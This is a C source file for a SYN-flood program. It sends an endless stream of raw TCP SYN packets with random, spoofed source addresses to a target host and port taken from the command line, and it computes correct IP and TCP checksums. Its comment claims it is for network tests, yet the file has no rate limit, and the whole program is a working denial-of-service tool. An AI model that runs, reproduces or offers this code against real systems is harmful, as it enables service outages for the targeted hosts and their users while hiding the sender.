/*
  Simple sin-flood with randomic ip source address.
  Derived from tcpdump code.

  Developed for networks tests. :)
  
  TODO: add a timer to limit bandwidth use.
*/

#include <netinet/in.h>
#include <sys/socket.h>

#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/*
 * Structure of an internet header, naked of options.
 *
 * We declare ip_len and ip_off to be short, rather than u_short
 * pragmatically since otherwise unsigned comparisons can result
 * against negative integers quite easily, and fail in subtle ways.
 */
struct ip {
        u_int8_t        ip_vhl;         /* header length, version */
#define IP_V(ip)        (((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)       ((ip)->ip_vhl & 0x0f)
        u_int8_t        ip_tos;         /* type of service */
        u_int16_t       ip_len;         /* total length */
        u_int16_t       ip_id;          /* identification */
        u_int16_t       ip_off;         /* fragment offset field */
#define IP_DF 0x4000                    /* dont fragment flag */
#define IP_MF 0x2000                    /* more fragments flag */
#define IP_OFFMASK 0x1fff               /* mask for fragmenting bits */
        u_int8_t        ip_ttl;         /* time to live */
        u_int8_t        ip_p;           /* protocol */
        u_int16_t       ip_sum;         /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

typedef u_int32_t       tcp_seq;

/*
 * TCP header.
 * Per RFC 793, September, 1981.
 */
struct tcphdr {
        u_int16_t       th_sport;               /* source port */
        u_int16_t       th_dport;               /* destination port */
        tcp_seq         th_seq;                 /* sequence number */
        tcp_seq         th_ack;                 /* acknowledgement number */
        u_int8_t        th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_int8_t        th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECNECHO      0x40    /* ECN Echo */
#define TH_CWR          0x80    /* ECN Cwnd Reduced */
        u_int16_t       th_win;                 /* window */
        u_int16_t       th_sum;                 /* checksum */
        u_int16_t       th_urp;                 /* urgent pointer */
};


void one_packet (const char *dst_addr, u_int16_t dport);

u_short in_cksum (const u_short *, register u_int, int);
u_int16_t in_cksum_shouldbe (u_int16_t, u_int16_t);
int tcp_cksum (register const struct ip *ip,
	    register const struct tcphdr *tp, register u_int len);

int
main (int argc, char **argv)
{
  const char *dst_addr;
  u_int16_t dport;

  dst_addr = strdup (argv[1]);
  if (dst_addr == NULL)
    {
      fprintf (stderr, "strdup: %s\n", strerror (errno));
      exit (1);
    }
  dport = atoi (argv[2]);
  srandom ((unsigned int) time (NULL));
  while (1)
    one_packet (dst_addr, dport);
  return 0;
}

void
one_packet (const char *dst_addr, u_int16_t dport)
{
  int tcp_socket;
  struct sockaddr_in peer;
  int retf;
  struct send_tcp
  {
    struct ip ip;
    struct tcphdr tcp;
  } packet;

  /* The above makes a struct called "packet" which will be the packet we
   * construct. Below are all the lines we use to actually build this packet.
   * See RFCs 791 and 793 for more info on the fields here and what they
   * mean.
   */

  packet.ip.ip_vhl = 69; /* Version and IHL */
  packet.ip.ip_tos = 0x10;         /* Type Of Service (TOS) */
  packet.ip.ip_len = 40;       /* total length of the IP datagram */
  packet.ip.ip_id = (u_int16_t) random (); /* identification */
  packet.ip.ip_off = htons (IP_DF);  /* fragmentation flag */
  packet.ip.ip_ttl = 255;          /* Time To Live (TTL) */
  packet.ip.ip_p = IPPROTO_TCP; /* protocol used (TCP in this case) */
  packet.ip.ip_sum = 0;          /* IP checksum */
  packet.ip.ip_src.s_addr = (u_int32_t) random ();
  packet.ip.ip_dst.s_addr = inet_addr (dst_addr);  /* destination address */

  packet.tcp.th_sport = htons ((u_int16_t) random ()); /* source port */
  packet.tcp.th_dport = htons (dport); /* destination port */
  packet.tcp.th_seq = 1;           /* sequence number */
  packet.tcp.th_ack = 2;       /* acknowledgement number */
  packet.tcp.th_offx2 = 95;          /* data offset */
  packet.tcp.th_flags = TH_SYN;
  packet.tcp.th_win = htons (512);  /* window */
  packet.tcp.th_sum = 0;
  packet.tcp.th_urp = 0;       /* urgent pointer */
  {
    u_int16_t tcp_sum, sum;

    sum = tcp_cksum(&(packet.ip), &(packet.tcp), 20);
    tcp_sum = in_cksum_shouldbe(0, sum);
    packet.tcp.th_sum = htons(tcp_sum);
  }
  /* That's got the packet formed. Now we go on making the "peer" struct
   * just as usual.
   */

  peer.sin_family = AF_INET;
  peer.sin_port = htons (dport);
  peer.sin_addr.s_addr = inet_addr (dst_addr);

  tcp_socket = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (tcp_socket == -1)
    {
      fprintf (stderr, "socket: %s\n", strerror (errno));
      exit (1);
    }
  retf = sendto (tcp_socket, &packet, sizeof (packet), 0,
                  (struct sockaddr *) &peer, sizeof (peer));
  if (retf == -1)
    {
      fprintf (stdout, "sendto: %s\n", strerror (errno));
      exit (1);
    }
  /* The 0 is for the flags */
  close (tcp_socket);
}

/*
 * compute an IP header checksum.
 * don't modifiy the packet.
 */
u_short
in_cksum (const u_short * addr, register u_int len, int csum)
{
  int nleft = len;
  const u_short *w = addr;
  u_short answer;
  int sum = csum;

  /*
   *  Our algorithm is simple, using a 32 bit accumulator (sum),
   *  we add sequential 16 bit words to it, and at the end, fold
   *  back all the carry bits from the top 16 bits into the lower
   *  16 bits.
   */
  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    sum += htons (*(u_char *) w << 8);

  /*
   * add back carry outs from top 16 bits to low 16 bits
   */
  sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
  sum += (sum >> 16);           /* add carry */
  answer = ~sum;                /* truncate to 16 bits */
  return (answer);
}

/*
 * Given the host-byte-order value of the checksum field in a packet
 * header, and the network-byte-order computed checksum of the data
 * that the checksum covers (including the checksum itself), compute
 * what the checksum field *should* have been.
 */
u_int16_t
in_cksum_shouldbe (u_int16_t sum, u_int16_t computed_sum)
{
  u_int32_t shouldbe;

  /*
   * The value that should have gone into the checksum field
   * is the negative of the value gotten by summing up everything
   * *but* the checksum field.
   *
   * We can compute that by subtracting the value of the checksum
   * field from the sum of all the data in the packet, and then
   * computing the negative of that value.
   *
   * "sum" is the value of the checksum field, and "computed_sum"
   * is the negative of the sum of all the data in the packets,
   * so that's -(-computed_sum - sum), or (sum + computed_sum).
   *
   * All the arithmetic in question is one's complement, so the
   * addition must include an end-around carry; we do this by
   * doing the arithmetic in 32 bits (with no sign-extension),
   * and then adding the upper 16 bits of the sum, which contain
   * the carry, to the lower 16 bits of the sum, and then do it
   * again in case *that* sum produced a carry.
   *
   * As RFC 1071 notes, the checksum can be computed without
   * byte-swapping the 16-bit words; summing 16-bit words
   * on a big-endian machine gives a big-endian checksum, which
   * can be directly stuffed into the big-endian checksum fields
   * in protocol headers, and summing words on a little-endian
   * machine gives a little-endian checksum, which must be
   * byte-swapped before being stuffed into a big-endian checksum
   * field.
   *
   * "computed_sum" is a network-byte-order value, so we must put
   * it in host byte order before subtracting it from the
   * host-byte-order value from the header; the adjusted checksum
   * will be in host byte order, which is what we'll return.
   */
  shouldbe = sum;
  shouldbe += ntohs (computed_sum);
  shouldbe = (shouldbe & 0xFFFF) + (shouldbe >> 16);
  shouldbe = (shouldbe & 0xFFFF) + (shouldbe >> 16);
  return shouldbe;
}

int
tcp_cksum (register const struct ip *ip,
           register const struct tcphdr *tp, register u_int len)
{
  union phu
  {
    struct phdr
    {
      u_int32_t src;
      u_int32_t dst;
      u_char mbz;
      u_char proto;
      u_int16_t len;
    } ph;
    u_int16_t pa[6];
  } phu;
  const u_int16_t *sp;

  /* pseudo-header.. */
  phu.ph.len = htons ((u_int16_t) len);
  phu.ph.mbz = 0;
  phu.ph.proto = IPPROTO_TCP;
  memcpy (&phu.ph.src, &ip->ip_src.s_addr, sizeof (u_int32_t));
  memcpy (&phu.ph.dst, &ip->ip_dst.s_addr, sizeof (u_int32_t));

  sp = &phu.pa[0];
  return in_cksum ((u_short *) tp, len,
                   sp[0] + sp[1] + sp[2] + sp[3] + sp[4] + sp[5]);
}
